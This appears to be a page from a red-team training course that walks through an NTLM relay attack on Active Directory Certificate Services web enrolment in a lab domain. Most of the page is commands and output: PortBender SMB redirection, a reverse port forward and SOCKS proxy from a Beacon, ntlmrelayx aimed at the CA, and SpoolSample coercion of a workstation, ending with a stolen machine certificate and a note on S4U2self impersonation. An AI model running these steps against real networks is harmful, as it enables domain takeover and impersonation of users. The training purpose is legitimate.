AD CS services support HTTP enrolment methods and even includes a GUI.  This endpoint is usually found at `http[s]://<hostname>/certsrv`, and by default supports **NTLM** and **Negotiate** authentication methods.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/adcs/http-gui.png)

  

In the default configuration, these endpoints are vulnerable to NTLM relay attacks.  A common abuse method is to coerce a domain controller to authenticate to an attacker-controller location, relay the request to the CA and obtain a certificate for that DC, then use it to obtain a TGT.  As well as PrintSpooler, [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers) contains other remote authentication methods.

Another aspect to be aware of is that you cannot relay authentication back to the original machine.  In this setup, the CA is running on DC-1, which means we cannot PrintSpooler (or other) DC-1 and relay it back to the same machine and get a certificate for DC-1.

Instead, we'll use WKSTN-3 as an example.

  

As SYSTEM on SRV-1:

-   Use PortBender to capture incoming traffic on port 445 and redirect it to port 8445.
-   Start a reverse port forward to forward traffic hitting port 8445 to the Team Server on port 445.
-   Start a SOCKS proxy for ntlmrelayx to send traffic back into the network.

  

```
beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection
                                            
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP

beacon> rportfwd 8445 127.0.0.1 445
[+] started reverse port forward on 8445 to 127.0.0.1:445

beacon> socks 1080
[+] started SOCKS4a server on: 1080
```

  

Start ntlmrelayx with proxychains:

```
root@kali:~# proxychains ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

  

Where:

-   10.10.15.75 is DC-1.

Next, use one of the remote authentication methods to force a connection from WKSTN-3 to SRV-1.

```
beacon> execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe 10.10.15.254 10.10.17.25

[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
```

  

Where:

-   10.10.15.254 is WKSTN-3.
-   10.10.17.25 is SRV-1.

  

We see the connection in the Beacon running PortBender.

```
[+] received output:
New connection from 10.10.15.254:53666 to 10.10.17.25:445
Disconnect from 10.10.15.254:53666 to 10.10.17.25:445
```

  

We also see the relay magic on Kali, and eventually receive a base64 encoded ticket (output slightly trimmed for brevity).

```
[*] SMBD-Thread-4: Connection from CYBER/WKSTN-3$@127.0.0.1 controlled, attacking target http://10.10.15.75
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
 ...  OK
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] SMBD-Thread-4: Connection from CYBER/WKSTN-3$@127.0.0.1 controlled, attacking target http://10.10.15.75
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] Authenticating against http://10.10.15.75 as CYBER/WKSTN-3$ SUCCEED
[*] GOT CERTIFICATE! ID 5
[*] Base64 certificate of user WKSTN-3$:
MIIQ3Q[...snip...]NzkQ==
```

After obtaining a TGT with the certificate, the S4U2self trick can be used to obtain a TGS for any service on the machine, on behalf of any user.